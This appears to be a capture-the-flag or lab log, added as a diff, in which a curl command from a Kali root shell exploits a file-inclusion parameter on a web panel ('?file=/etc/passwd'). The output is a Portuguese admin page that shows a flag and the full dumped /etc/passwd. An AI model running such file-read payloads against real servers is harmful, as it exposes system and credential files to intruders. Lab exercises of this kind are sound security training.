@@ -1,0 +1,63 @@
+┌──(root㉿kali)-[~]
+└─# curl http://98.95.207.28/panel.php?file=/etc/passwd
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel v2</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>Admin Panel v2.0 (Beta)</h1>
+        </div>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <h2>Sistema de Gerenciamento Avançado</h2>
+
+            <div class="alert alert-success">
+                <strong>Parabéns por encontrar o painel secreto!</strong><br>
+                FLAG{s3cr3t_p4n3l_d1sc0v3ry}
+            </div>
+
+            <h3>Módulos Disponíveis</h3>
+            <ul>
+                <li><a href="?file=logs">Ver Logs do Sistema</a></li>
+                <li><a href="?file=config">Configurações</a></li>
+                <li><a href="?file=users">Gerenciar Usuários</a></li>
+            </ul>
+
+            <div style="margin-top: 2rem; padding: 1rem; background: #f0f0f0; border-radius: 4px;">
+                <pre>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</pre>            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 TechCorp Solutions - Internal Use Only</p>
+        </div>
+    </footer>
+</body>
+</html>
